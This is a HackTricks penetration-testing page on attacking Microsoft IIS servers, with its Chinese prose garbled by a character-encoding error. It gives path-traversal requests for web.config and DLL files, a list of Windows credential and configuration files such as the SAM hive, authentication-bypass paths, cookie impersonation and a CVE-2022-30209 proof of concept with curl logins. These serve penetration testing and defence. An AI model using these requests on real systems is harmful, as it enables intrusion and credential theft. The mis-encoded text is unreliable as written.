# IIS - Internet Information Services

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)æ˜¯ä¸€ä¸ªç”±**æš—ç½‘**æ”¯æŒçš„æœç´¢å¼•æ“ï¼Œæä¾›**å…è´¹**åŠŸèƒ½ï¼Œç”¨äºæ£€æŸ¥å…¬å¸æˆ–å…¶å®¢æˆ·æ˜¯å¦å—åˆ°**çªƒå–æ¶æ„è½¯ä»¶**çš„**ä¾µå®³**ã€‚

WhiteIntelçš„ä¸»è¦ç›®æ ‡æ˜¯æ‰“å‡»ç”±çªƒå–ä¿¡æ¯æ¶æ„è½¯ä»¶å¯¼è‡´çš„è´¦æˆ·åŠ«æŒå’Œå‹’ç´¢è½¯ä»¶æ”»å‡»ã€‚

æ‚¨å¯ä»¥è®¿é—®ä»–ä»¬çš„ç½‘ç«™å¹¶å…è´¹å°è¯•ä»–ä»¬çš„å¼•æ“ï¼š

{% embed url="https://whiteintel.io" %}

---

æµ‹è¯•å¯æ‰§è¡Œæ–‡ä»¶æ‰©å±•åï¼š

* asp
* aspx
* config
* php

## å†…éƒ¨IPåœ°å€æ³„éœ²

åœ¨ä»»ä½•æ”¶åˆ°302å“åº”çš„IISæœåŠ¡å™¨ä¸Šï¼Œæ‚¨å¯ä»¥å°è¯•å‰¥ç¦»ä¸»æœºå¤´å¹¶ä½¿ç”¨HTTP/1.0ï¼Œåœ¨å“åº”ä¸­ï¼ŒLocationå¤´å¯èƒ½æŒ‡å‘å†…éƒ¨IPåœ°å€ï¼š
```
nc -v domain.com 80
openssl s_client -connect domain.com:443
```
æŠ«éœ²å†…éƒ¨IPçš„å“åº”ï¼š
```
GET / HTTP/1.0

HTTP/1.1 302 Moved Temporarily
Cache-Control: no-cache
Pragma: no-cache
Location: https://192.168.5.237/owa/
Server: Microsoft-IIS/10.0
X-FEServer: NHEXCHANGE2016
```
## æ‰§è¡Œ .config æ–‡ä»¶

æ‚¨å¯ä»¥ä¸Šä¼  .config æ–‡ä»¶å¹¶ä½¿ç”¨å®ƒä»¬æ¥æ‰§è¡Œä»£ç ã€‚ä¸€ç§æ–¹æ³•æ˜¯å°†ä»£ç é™„åŠ åˆ°æ–‡ä»¶æœ«å°¾çš„ HTML æ³¨é‡Šä¸­ï¼š[åœ¨æ­¤ä¸‹è½½ç¤ºä¾‹](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)

æœ‰å…³æ›´å¤šä¿¡æ¯å’Œåˆ©ç”¨æ­¤æ¼æ´çš„æŠ€æœ¯ï¼Œè¯·æŸ¥çœ‹[æ­¤å¤„](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/)

## IIS å‘ç°æš´åŠ›ç ´è§£

ä¸‹è½½æˆ‘åˆ›å»ºçš„åˆ—è¡¨ï¼š

{% file src="../../.gitbook/assets/iisfinal.txt" %}

è¯¥åˆ—è¡¨æ˜¯é€šè¿‡åˆå¹¶ä»¥ä¸‹åˆ—è¡¨çš„å†…å®¹åˆ›å»ºçš„ï¼š

[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/IIS.fuzz.txt)\
[http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html](http://itdrafts.blogspot.com/2013/02/aspnetclient-folder-enumeration-and.html)\
[https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt](https://github.com/digination/dirbuster-ng/blob/master/wordlists/vulns/iis.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/aspx.txt)\
[https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt](https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/SVNDigger/cat/Language/asp.txt)\
[https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt](https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/vulns/iis.txt)

è¯·åœ¨ä¸æ·»åŠ ä»»ä½•æ‰©å±•åçš„æƒ…å†µä¸‹ä½¿ç”¨ï¼Œéœ€è¦æ‰©å±•åçš„æ–‡ä»¶å·²ç»åŒ…å«åœ¨å†…ã€‚

## è·¯å¾„éå†

### æ³„éœ²æºä»£ç 

æŸ¥çœ‹å®Œæ•´çš„è§£è¯´ï¼š[https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html](https://blog.mindedsecurity.com/2018/10/from-path-traversal-to-source-code-in.html)

{% hint style="info" %}
ç®€è€Œè¨€ä¹‹ï¼Œåº”ç”¨ç¨‹åºçš„æ–‡ä»¶å¤¹ä¸­æœ‰å‡ ä¸ªåŒ…å«å¯¹ "**assemblyIdentity**" æ–‡ä»¶å’Œ "**namespaces**" çš„å¼•ç”¨çš„ web.config æ–‡ä»¶ã€‚æœ‰äº†è¿™äº›ä¿¡æ¯ï¼Œå°±å¯ä»¥çŸ¥é“ **å¯æ‰§è¡Œæ–‡ä»¶çš„ä½ç½®** å¹¶ä¸‹è½½å®ƒä»¬ã€‚\
ä» **ä¸‹è½½çš„ Dlls** ä¸­ï¼Œè¿˜å¯ä»¥æ‰¾åˆ°åº”è¯¥å°è¯•è®¿é—®å¹¶è·å– web.config æ–‡ä»¶ä»¥æŸ¥æ‰¾æ–°çš„ namespaces å’Œ assemblyIdentity çš„ **æ–° namespaces**ã€‚\
æ­¤å¤–ï¼Œæ–‡ä»¶ **connectionstrings.config** å’Œ **global.asax** å¯èƒ½åŒ…å«æœ‰è¶£çš„ä¿¡æ¯ã€‚\\
{% endhint %}

åœ¨ **.Net MVC åº”ç”¨ç¨‹åº** ä¸­ï¼Œ**web.config** æ–‡ä»¶é€šè¿‡ **"assemblyIdentity"** XML æ ‡è®°æŒ‡å®šåº”ç”¨ç¨‹åºä¾èµ–çš„æ¯ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ã€‚

### **æ¢ç´¢äºŒè¿›åˆ¶æ–‡ä»¶**

ä¸‹é¢æ˜¯è®¿é—® **web.config** æ–‡ä»¶çš„ç¤ºä¾‹ï¼š
```markup
GET /download_page?id=..%2f..%2fweb.config HTTP/1.1
Host: example-mvc-application.minded
```
æ­¤è¯·æ±‚æ˜¾ç¤ºäº†å„ç§è®¾ç½®å’Œä¾èµ–é¡¹ï¼Œä¾‹å¦‚ï¼š

* **EntityFramework** ç‰ˆæœ¬
* ç”¨äºç½‘é¡µã€å®¢æˆ·ç«¯éªŒè¯å’Œ JavaScript çš„ **AppSettings**
* ç”¨äºèº«ä»½éªŒè¯å’Œè¿è¡Œæ—¶çš„ **System.web** é…ç½®
* **System.webServer** æ¨¡å—è®¾ç½®
* ç”¨äºè®¸å¤šåº“çš„ **Runtime** ç»„ä»¶ç»‘å®šï¼Œå¦‚ **Microsoft.Owin**ã€**Newtonsoft.Json** å’Œ **System.Web.Mvc**

è¿™äº›è®¾ç½®è¡¨æ˜æŸäº›æ–‡ä»¶ï¼Œå¦‚ **/bin/WebGrease.dll**ï¼Œä½äºåº”ç”¨ç¨‹åºçš„ /bin æ–‡ä»¶å¤¹ä¸­ã€‚

### **æ ¹ç›®å½•æ–‡ä»¶**

æ ¹ç›®å½•ä¸­çš„æ–‡ä»¶ï¼Œå¦‚ **/global.asax** å’Œ **/connectionstrings.config**ï¼ˆå…¶ä¸­åŒ…å«æ•æ„Ÿå¯†ç ï¼‰ï¼Œå¯¹åº”ç”¨ç¨‹åºçš„é…ç½®å’Œæ“ä½œè‡³å…³é‡è¦ã€‚

### **å‘½åç©ºé—´å’Œ Web.Config**

MVC åº”ç”¨ç¨‹åºè¿˜ä¸ºç‰¹å®šå‘½åç©ºé—´å®šä¹‰äº†é¢å¤–çš„ **web.config æ–‡ä»¶**ï¼Œä»¥é¿å…åœ¨æ¯ä¸ªæ–‡ä»¶ä¸­é‡å¤å£°æ˜ï¼Œå¦‚é€šè¿‡è¯·æ±‚ä¸‹è½½å¦ä¸€ä¸ª **web.config** æ–‡ä»¶æ‰€ç¤ºï¼š
```markup
GET /download_page?id=..%2f..%2fViews/web.config HTTP/1.1
Host: example-mvc-application.minded
```
### **ä¸‹è½½ DLLs**

æåˆ°è‡ªå®šä¹‰å‘½åç©ºé—´æš—ç¤ºç€åœ¨ /bin ç›®å½•ä¸­å­˜åœ¨ä¸€ä¸ªåä¸º "**WebApplication1**" çš„ DLLã€‚æ¥ç€å±•ç¤ºäº†ä¸‹è½½ **WebApplication1.dll** çš„è¯·æ±‚ï¼š
```markup
GET /download_page?id=..%2f..%2fbin/WebApplication1.dll HTTP/1.1
Host: example-mvc-application.minded
```
è¿™è¡¨æ˜åœ¨/binç›®å½•ä¸­å­˜åœ¨å…¶ä»–é‡è¦çš„DLLï¼Œæ¯”å¦‚**System.Web.Mvc.dll**å’Œ**System.Web.Optimization.dll**ã€‚

åœ¨ä¸€ä¸ªåœºæ™¯ä¸­ï¼Œä¸€ä¸ªDLLå¯¼å…¥äº†ä¸€ä¸ªåä¸º**WebApplication1.Areas.Minded**çš„å‘½åç©ºé—´ï¼Œæ”»å‡»è€…å¯èƒ½æ¨æ–­å‡ºåœ¨å¯é¢„æµ‹è·¯å¾„ä¸­å­˜åœ¨å…¶ä»–web.configæ–‡ä»¶ï¼Œæ¯”å¦‚**/area-name/Views/**ï¼Œå…¶ä¸­åŒ…å«ç‰¹å®šé…ç½®å’Œå¯¹/binæ–‡ä»¶å¤¹ä¸­å…¶ä»–DLLçš„å¼•ç”¨ã€‚ä¾‹å¦‚ï¼Œå¯¹**/Minded/Views/web.config**çš„è¯·æ±‚å¯ä»¥æ˜¾ç¤ºé…ç½®å’Œå‘½åç©ºé—´ï¼Œè¡¨æ˜å¦ä¸€ä¸ªDLL **WebApplication1.AdditionalFeatures.dll**çš„å­˜åœ¨ã€‚

### å¸¸è§æ–‡ä»¶

æ¥è‡ª[è¿™é‡Œ](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
```
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini"
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```
## HTTPAPI 2.0 404é”™è¯¯

å¦‚æœä½ çœ‹åˆ°å¦‚ä¸‹é”™è¯¯ï¼š

![](<../../.gitbook/assets/image (446) (1) (2) (2) (3) (3) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (10) (10) (2).png>)

è¿™æ„å‘³ç€æœåŠ¡å™¨**æ²¡æœ‰æ”¶åˆ°æ­£ç¡®çš„åŸŸå**åœ¨Hostæ ‡å¤´ä¸­ã€‚\
ä¸ºäº†è®¿é—®ç½‘é¡µï¼Œä½ å¯ä»¥æŸ¥çœ‹æä¾›çš„**SSLè¯ä¹¦**ï¼Œä¹Ÿè®¸ä½ å¯ä»¥åœ¨å…¶ä¸­æ‰¾åˆ°åŸŸå/å­åŸŸåã€‚å¦‚æœæ‰¾ä¸åˆ°ï¼Œä½ å¯èƒ½éœ€è¦**æš´åŠ›ç ´è§£è™šæ‹Ÿä¸»æœº**ç›´åˆ°æ‰¾åˆ°æ­£ç¡®çš„ä¸€ä¸ªã€‚

## å€¼å¾—å¯»æ‰¾çš„æ—§IISæ¼æ´

### Microsoft IISæ³¢æµªç¬¦â€œ\~â€æ¼æ´/ç‰¹æ€§ - çŸ­æ–‡ä»¶/æ–‡ä»¶å¤¹åæ³„éœ²

ä½ å¯ä»¥å°è¯•ä½¿ç”¨è¿™ä¸ª**æŠ€æœ¯**æ¥**æšä¸¾**æ¯ä¸ªå‘ç°çš„æ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼ˆå³ä½¿éœ€è¦åŸºæœ¬èº«ä»½éªŒè¯ï¼‰ã€‚\
è¿™ç§æŠ€æœ¯çš„ä¸»è¦é™åˆ¶æ˜¯ï¼Œå¦‚æœæœåŠ¡å™¨å­˜åœ¨æ¼æ´ï¼Œ**å®ƒåªèƒ½æ‰¾åˆ°æ¯ä¸ªæ–‡ä»¶/æ–‡ä»¶å¤¹åç§°çš„å‰6ä¸ªå­—æ¯å’Œæ–‡ä»¶æ‰©å±•åçš„å‰3ä¸ªå­—æ¯**ã€‚

ä½ å¯ä»¥ä½¿ç”¨[https://github.com/irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)æ¥æµ‹è¯•è¿™ä¸ªæ¼æ´ï¼š`java -jar iis_shortname_scanner.jar 2 20 http://10.13.38.11/dev/dca66d38fd916317687e1390a420c3fc/db/`

![](<../../.gitbook/assets/image (841).png>)

åŸå§‹ç ”ç©¶ï¼š[https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf](https://soroush.secproject.com/downloadable/microsoft\_iis\_tilde\_character\_vulnerability\_feature.pdf)

ä½ ä¹Ÿå¯ä»¥ä½¿ç”¨**metasploit**ï¼š`use scanner/http/iis_shortname_scanner`

### åŸºæœ¬èº«ä»½éªŒè¯ç»•è¿‡

å°è¯•ç»•è¿‡åŸºæœ¬èº«ä»½éªŒè¯ï¼ˆ**IIS 7.5**ï¼‰å°è¯•è®¿é—®ï¼š`/admin:$i30:$INDEX_ALLOCATION/admin.php`æˆ–`/admin::$INDEX_ALLOCATION/admin.php`

ä½ å¯ä»¥å°è¯•**ç»“åˆ**è¿™ä¸ª**æ¼æ´**å’Œä¸Šä¸€ä¸ªæ¥å‘ç°æ–°çš„**æ–‡ä»¶å¤¹**å¹¶**ç»•è¿‡**èº«ä»½éªŒè¯ã€‚

## ASP.NET Trace.AXDå¯ç”¨è°ƒè¯•

ASP.NETåŒ…æ‹¬ä¸€ä¸ªè°ƒè¯•æ¨¡å¼ï¼Œå…¶æ–‡ä»¶åä¸º`trace.axd`ã€‚

å®ƒä¼šè¯¦ç»†è®°å½•ä¸€æ®µæ—¶é—´å†…å‘é€åˆ°åº”ç”¨ç¨‹åºçš„æ‰€æœ‰è¯·æ±‚ã€‚

è¿™äº›ä¿¡æ¯åŒ…æ‹¬è¿œç¨‹å®¢æˆ·ç«¯IPã€ä¼šè¯IDã€æ‰€æœ‰è¯·æ±‚å’Œå“åº”cookieã€ç‰©ç†è·¯å¾„ã€æºä»£ç ä¿¡æ¯ï¼Œç”šè‡³å¯èƒ½åŒ…æ‹¬ç”¨æˆ·åå’Œå¯†ç ã€‚

[https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/](https://www.rapid7.com/db/vulnerabilities/spider-asp-dot-net-trace-axd/)

![Screenshot 2021-03-30 at 13 19 11](https://user-images.githubusercontent.com/31736688/112974448-2690b000-915b-11eb-896c-f41c27c44286.png)

## ASPXAUTH Cookie

ASPXAUTHä½¿ç”¨ä»¥ä¸‹ä¿¡æ¯ï¼š

- **`validationKey`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šç”¨äºç­¾åéªŒè¯çš„åå…­è¿›åˆ¶ç¼–ç å¯†é’¥ã€‚
- **`decryptionMethod`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šï¼ˆé»˜è®¤ä¸ºâ€œAESâ€ï¼‰ã€‚
- **`decryptionIV`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šåå…­è¿›åˆ¶ç¼–ç çš„åˆå§‹åŒ–å‘é‡ï¼ˆé»˜è®¤ä¸ºé›¶å‘é‡ï¼‰ã€‚
- **`decryptionKey`**ï¼ˆå­—ç¬¦ä¸²ï¼‰ï¼šç”¨äºè§£å¯†çš„åå…­è¿›åˆ¶ç¼–ç å¯†é’¥ã€‚

ç„¶è€Œï¼Œä¸€äº›äººä¼šä½¿ç”¨è¿™äº›å‚æ•°çš„**é»˜è®¤å€¼**ï¼Œå¹¶å°†ç”¨æˆ·çš„**ç”µå­é‚®ä»¶ä½œä¸ºcookie**ã€‚å› æ­¤ï¼Œå¦‚æœä½ èƒ½æ‰¾åˆ°ä¸€ä¸ªä½¿ç”¨ASPXAUTH cookieçš„**ç›¸åŒå¹³å°**çš„ç½‘ç«™ï¼Œå¹¶åœ¨å—æ”»å‡»çš„æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªä½¿ç”¨è¦å†’å……ç”¨æˆ·çš„ç”¨æˆ·çš„ç”µå­é‚®ä»¶çš„ç”¨æˆ·ï¼Œä½ å¯èƒ½èƒ½å¤Ÿåœ¨ç¬¬ä¸€ä¸ªæœåŠ¡å™¨ä¸­ä½¿ç”¨ç¬¬äºŒä¸ªæœåŠ¡å™¨çš„cookieå¹¶å†’å……ç”¨æˆ·ã€‚\
è¿™ç§æ”»å‡»åœ¨è¿™ä¸ª[**writeup**](https://infosecwriteups.com/how-i-hacked-facebook-part-two-ffab96d57b19)ä¸­èµ·ä½œç”¨ã€‚

## IISèº«ä»½éªŒè¯ç»•è¿‡ç¼“å­˜å¯†ç ï¼ˆCVE-2022-30209ï¼‰<a href="#id-3-iis-authentication-bypass" id="id-3-iis-authentication-bypass"></a>

[å®Œæ•´æŠ¥å‘Šåœ¨æ­¤å¤„](https://blog.orange.tw/2022/08/lets-dance-in-the-cache-destabilizing-hash-table-on-microsoft-iis.html)ï¼šä»£ç ä¸­çš„ä¸€ä¸ªé”™è¯¯**æœªæ­£ç¡®æ£€æŸ¥ç”¨æˆ·æä¾›çš„å¯†ç **ï¼Œå› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…çš„**å¯†ç å“ˆå¸Œå‘½ä¸­å·²ç»åœ¨ç¼“å­˜ä¸­çš„å¯†é’¥**ï¼Œå°†èƒ½å¤Ÿä»¥è¯¥ç”¨æˆ·èº«ä»½ç™»å½•ã€‚
```python
# script for sanity check
> type test.py
def HashString(password):
j = 0
for c in map(ord, password):
j = c + (101*j)&0xffffffff
return j

assert HashString('test-for-CVE-2022-30209-auth-bypass') == HashString('ZeeiJT')

# before the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 401 Unauthorized

# after the successful login
> curl -I -su 'orange:ZeeiJT' 'http://<iis>/protected/' | findstr HTTP
HTTP/1.1 200 OK
```
### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) æ˜¯ä¸€ä¸ªç”±**æš—ç½‘**æ”¯æŒçš„æœç´¢å¼•æ“ï¼Œæä¾›å…è´¹åŠŸèƒ½ï¼Œç”¨äºæ£€æŸ¥å…¬å¸æˆ–å…¶å®¢æˆ·æ˜¯å¦å—åˆ°**çªƒå–æ¶æ„è½¯ä»¶**çš„**ä¾µå®³**ã€‚

WhiteIntelçš„ä¸»è¦ç›®æ ‡æ˜¯æ‰“å‡»ç”±çªƒå–ä¿¡æ¯æ¶æ„è½¯ä»¶å¯¼è‡´çš„è´¦æˆ·åŠ«æŒå’Œå‹’ç´¢è½¯ä»¶æ”»å‡»ã€‚

æ‚¨å¯ä»¥è®¿é—®ä»–ä»¬çš„ç½‘ç«™å¹¶å…è´¹å°è¯•ä»–ä»¬çš„å¼•æ“ï¼š

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
